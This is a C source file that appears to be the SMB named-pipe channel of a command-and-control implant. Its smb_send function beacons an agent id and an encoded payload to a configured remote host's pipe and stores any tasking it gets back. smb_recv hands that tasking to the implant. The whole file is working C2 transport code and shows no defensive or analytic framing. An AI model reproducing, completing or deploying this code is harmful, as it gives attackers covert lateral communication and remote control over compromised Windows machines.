#include "channels.h"
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#define SMB_MAX_RESP 131072
#define SMB_CONNECT_RETRIES 3
#define SMB_PIPE_WAIT_MS 3000

static char s_pending[SMB_MAX_RESP];
static int s_pending_set = 0;

/* internal helpers */

static int json_str(const char *json, const char *key, char *out, size_t out_sz)
{
    char needle[128];
    snprintf(needle, sizeof(needle), "\"%s\":", key);
    const char *p = strstr(json, needle);
    if (!p)
        return -1;
    p += strlen(needle);
    while (*p == ' ')
        p++;
    if (*p != '"')
        return -1;
    p++;
    size_t i = 0;
    while (*p && *p != '"' && i < out_sz - 1)
    {
        if (*p == '\\' && *(p + 1))
            p++;
        out[i++] = *p++;
    }
    out[i] = '\0';
    return 0;
}

static BOOL pipe_read_exact(HANDLE h, void *buf, DWORD len)
{
    DWORD done = 0;
    while (done < len)
    {
        DWORD nr = 0;
        if (!ReadFile(h, (char *)buf + done, len - done, &nr, NULL) || nr == 0)
            return FALSE;
        done += nr;
    }
    return TRUE;
}

static BOOL pipe_write_exact(HANDLE h, const void *buf, DWORD len)
{
    DWORD done = 0;
    while (done < len)
    {
        DWORD nw = 0;
        if (!WriteFile(h, (const char *)buf + done, len - done, &nw, NULL) || nw == 0)
            return FALSE;
        done += nw;
    }
    return TRUE;
}

/* send beacon over SMB named pipe, buffer task from response */

int smb_send(const channel_config_t *cfg, const char *agent_id, const char *b64)
{
    if (!cfg->smb_host[0] || !cfg->smb_pipe[0])
        return CHANNEL_ERR;
    s_pending_set = 0;

    char path[640];
    snprintf(path, sizeof(path), "\\\\%s\\pipe\\%s", cfg->smb_host, cfg->smb_pipe);

    wchar_t wpath[640] = {0};
    if (MultiByteToWideChar(CP_UTF8, 0, path, -1, wpath, 640) == 0)
        return CHANNEL_ERR;

    HANDLE hPipe = INVALID_HANDLE_VALUE;
    for (int i = 0; i < SMB_CONNECT_RETRIES && hPipe == INVALID_HANDLE_VALUE; i++)
    {
        hPipe = CreateFileW(wpath,
                            GENERIC_READ | GENERIC_WRITE,
                            0, NULL, OPEN_EXISTING, 0, NULL);
        if (hPipe == INVALID_HANDLE_VALUE)
        {
            if (GetLastError() != ERROR_PIPE_BUSY)
                return CHANNEL_ERR;
            WaitNamedPipeW(wpath, SMB_PIPE_WAIT_MS);
        }
    }
    if (hPipe == INVALID_HANDLE_VALUE)
        return CHANNEL_ERR;

    /* build JSON body */
    size_t body_sz = strlen(agent_id) + strlen(b64) + 32;
    char *body = (char *)malloc(body_sz);
    if (!body)
    {
        CloseHandle(hPipe);
        return CHANNEL_ERR;
    }
    int body_len = snprintf(body, body_sz, "{\"id\":\"%s\",\"p\":\"%s\"}", agent_id, b64);
    if (body_len <= 0) { free(body); CloseHandle(hPipe); return CHANNEL_ERR; }

    /* write: 4-byte LE length then payload */
    uint32_t wlen = (uint32_t)body_len;
    BOOL ok = pipe_write_exact(hPipe, &wlen, 4) &&
              pipe_write_exact(hPipe, body, wlen);
    free(body);
    if (!ok)
    {
        CloseHandle(hPipe);
        return CHANNEL_ERR;
    }

    /* read 4-byte LE response length */
    uint32_t rlen = 0;
    if (!pipe_read_exact(hPipe, &rlen, 4) || rlen == 0 || rlen >= SMB_MAX_RESP)
    {
        CloseHandle(hPipe);
        return CHANNEL_ERR;
    }

    /* read response body */
    char *resp = (char *)malloc(rlen + 1);
    if (!resp)
    {
        CloseHandle(hPipe);
        return CHANNEL_ERR;
    }
    ok = pipe_read_exact(hPipe, resp, rlen);
    CloseHandle(hPipe);
    if (!ok)
    {
        free(resp);
        return CHANNEL_ERR;
    }
    resp[rlen] = '\0';

    /* buffer task if present */
    char task[SMB_MAX_RESP];
    if (json_str(resp, "p", task, sizeof(task)) == 0 && task[0])
    {
        strncpy(s_pending, task, sizeof(s_pending) - 1);
        s_pending[sizeof(s_pending) - 1] = '\0';
        s_pending_set = 1;
    }
    free(resp);
    return CHANNEL_OK;
}

/* return task buffered by smb_send, NULL if none */

char *smb_recv(void)
{
    if (!s_pending_set || !s_pending[0])
        return NULL;
    char *ret = strdup(s_pending);
    s_pending[0] = '\0';
    s_pending_set = 0;
    return ret;
}